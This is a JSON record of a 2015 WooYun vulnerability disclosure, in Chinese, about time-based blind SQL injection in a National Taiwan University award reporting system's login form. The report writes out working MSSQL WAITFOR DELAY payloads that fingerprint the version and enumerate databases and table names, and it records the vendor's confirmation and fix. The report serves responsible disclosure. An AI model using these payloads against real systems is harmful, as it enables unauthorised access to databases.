{"id": 80499, "wybug_id": "wooyun-2015-0155770", "wybug_title": "國立臺灣大學某系統sql注入漏洞（279库）（臺灣地區）", "wybug_corp": "國立臺灣大學", "wybug_author": "云野", "wybug_date": "2015-11-25 13:29", "wybug_open_date": "2016-01-11 22:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： dbid测得是279个库……mssql2008的post注入，延时 详细说明：  國立臺灣大學研究生獎勵金資訊申報系統，网址：https://**.**.**.**/award/看到登录框，先试一下用户名admin'密码随意登录，发现跳到错误页面然后用户名admin' or 1=1 or 'a'='a显示账号或密码错误\n\n闭合了引号，有戏试一下延时，\n\n判断数据库版本：\nadmin';if @@version like '%2008%' WAITFOR DELAY '0:0:3'--\n有延时，数据库版本为mssql 2008\n\n跑当前数据库：admin';if len(db_name())>5 WAITFOR DELAY '0:0:3'--为假当前数据库长度为5，逐位跑\nadmin';if (ascii(substring(db_name(),1,1)))>97 WAITFOR DELAY '0:0:3'--\n数据库为award当前用户：长度为8……太长了，不猜了……看看数据库数量\nadmin';if(select count(*) from master.dbo.sysdatabases where dbid=279)=1 WAITFOR DELAY '0:0:3'--\n有279个库……用这个可以逐位猜库名\nadmin';if (select count(*) from master.dbo.sysdatabases where dbid=11 and ascii(substring(name,1,1))>0)=1 WAITFOR DELAY '0:0:3'--\ndbid=69的库名字是admin\nadmin';if (select count(*) from master.dbo.sysdatabases where dbid=69 and substring(name,1,5) like 'admin')=1 WAITFOR DELAY '0:0:3'--\n用这个猜表名：\nadmin';if (select count(*) from accr.dbo.sysobjects where name in (select top 1 name from accr.dbo.sysobjects where xtype='u') and ascii(substring(name,1,1))>0)=1 WAITFOR DELAY '0:0:3'--\n可以跑出来数据就够了吧……下来要写工具跑了   漏洞证明：  见说明   修复方案：  过滤   版权声明：转载请注明来源 云野@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-11-27 22:33 厂商回复： 感謝通報 最新状态： 2016-01-12：已修復  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}